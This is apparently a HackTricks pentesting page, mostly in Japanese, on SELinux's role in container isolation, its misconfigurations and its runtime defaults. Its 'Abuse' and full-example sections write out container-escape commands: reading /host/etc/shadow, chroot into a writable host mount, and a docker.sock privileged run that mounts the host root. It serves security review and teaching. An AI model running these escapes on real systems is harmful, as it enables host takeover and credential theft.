# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

SELinux は **ラベルベースの強制アクセス制御** システムです。関連するすべてのプロセスやオブジェクトはセキュリティコンテキストを持つことがあり、ポリシーはどのドメインがどのタイプとどのように相互作用できるかを決定します。コンテナ化された環境では、通常ランタイムがコンテナプロセスを隔離されたコンテナドメインの下で起動し、コンテナ内のコンテンツに対応するタイプでラベル付けします。ポリシーが正しく機能していれば、そのプロセスはラベルで想定されている対象の読み書きが可能で、たとえマウントを通じて内容が見えるようになっても他のホスト上のコンテンツへのアクセスは拒否されます。

これは主流の Linux コンテナ導入環境で利用可能な最も強力なホスト側保護のひとつです。Fedora、RHEL、CentOS Stream、OpenShift、そしてその他の SELinux 中心のエコシステムでは特に重要です。そうした環境では、SELinux を無視するレビュアーは、一見明白に見えるホスト侵害の経路が実際にはなぜブロックされているのかを誤解しがちです。

## AppArmor と SELinux の違い

最も分かりやすいハイレベルな違いは、AppArmor がパスベースであるのに対し、SELinux は **ラベルベース** である点です。これはコンテナセキュリティに大きな影響を与えます。パスベースのポリシーは、同じホストの内容が予期しないマウントパスで見えるようになると動作が変わる可能性があります。ラベルベースのポリシーは代わりにオブジェクトのラベルが何であるか、プロセスドメインがそれに対して何ができるかを問います。これは SELinux を単純にするわけではありませんが、AppArmor ベースのシステムで守備側が時折誤って立てがちなパスを使った前提に対して強靭です。

モデルがラベル指向であるため、コンテナのボリューム取り扱いや再ラベリングの判断はセキュリティ上重要です。ランタイムやオペレータが「マウントを動かす」ためにラベルを過度に変更すると、本来ワークロードを隔離するはずだったポリシー境界が意図よりもずっと弱くなる可能性があります。

## 実習

ホスト上で SELinux が有効かどうかを確認するには:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
ホスト上の既存のラベルを確認するには:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
ラベリングが無効な実行と通常の実行を比較するには:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
ホストの bind mount が存在し、SELinux のラベリングが無効化または弱体化されている場合、最初に情報の開示が発生することが多い：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount が writable で、container が kernel の観点から見て事実上 host-root である場合、次のステップは推測するのではなく、制御された host modification をテストすることです:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux 対応のホストでは、ランタイム状態ディレクトリ周辺のラベルが失われると、直接的な privilege-escalation の経路が露呈することがある:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
これらのコマンドは完全なエスケープチェーンの代わりにはなりませんが、SELinux がホストデータへのアクセスやホスト側のファイル修正を妨げていたかどうかを非常に短時間で判断できます。

### 完全な例: SELinux 無効 + 書き込み可能なホストマウント

SELinux のラベリングが無効化され、ホストのファイルシステムが `/host` に書き込み可能でマウントされている場合、完全なホスト脱出は通常の bind-mount 悪用ケースになります:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` が成功すると、container process は host filesystem 上で動作するようになります：
```bash
id
hostname
cat /etc/passwd | tail
```
### 完全な例: SELinux Disabled + ランタイムディレクトリ

ラベルが無効化された後にワークロードがランタイムソケットに到達できる場合、escape はランタイムに委譲できます:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
関連する観察点は、SELinuxがしばしばまさにこの種のhost-pathやruntime-stateへのアクセスを防ぐ制御であったということです。

## Checks

SELinuxのチェックの目的は、SELinuxが有効かを確認し、現在のセキュリティコンテキストを特定し、関係するファイルやパスが実際にlabel-confinedになっているかを確認することです。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
What is interesting here:

- `getenforce` は理想的には `Enforcing` を返すべきです；`Permissive` または `Disabled` は SELinux セクション全体の意味を変えます。
- 現在のプロセスコンテキストが予期しない、または広すぎるように見える場合、そのワークロードは意図したコンテナポリシーの下で動作していない可能性があります。
- ホストにマウントされたファイルやランタイムディレクトリにプロセスが過度にアクセスできるラベルが付いている場合、bind mounts ははるかに危険になります。

SELinux 対応プラットフォーム上のコンテナをレビューする際、ラベリングを二次的な詳細として扱ってはいけません。多くの場合、それがホストがまだ侵害されていない主要な理由の一つです。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの挙動 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | ホスト依存 | SELinux 対応ホストでは SELinux による分離が利用可能ですが、正確な挙動はホスト/daemon の設定に依存します | `--security-opt label=disable`, bind mounts の広範な再ラベリング, `--privileged` |
| Podman | SELinux ホストでは一般的に有効 | 無効化されていない限り、SELinux システム上の Podman では SELinux による分離が通常の一部です | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Pod レベルで自動的に割り当てられることは一般的ではない | SELinux サポートは存在しますが、Pods は通常 `securityContext.seLinuxOptions` やプラットフォーム固有のデフォルトを必要とします；ランタイムとノードのサポートも必要です | 弱いまたは広範な `seLinuxOptions`, permissive/disabled ノードでの実行, ラベリングを無効にするプラットフォームポリシー |
| CRI-O / OpenShift style deployments | 多くの場合、重要な要素として利用される | これらの環境では、SELinux がノード分離モデルの中核であることが多いです | アクセスを過度に広げるカスタムポリシー、互換性のためにラベリングを無効化する設定 |

SELinux のデフォルトは seccomp のデフォルトよりもディストリビューションに依存します。Fedora/RHEL/OpenShift スタイルのシステムでは、SELinux が隔離モデルの中心であることが多いです。SELinux 非対応のシステムでは、単に存在しません。
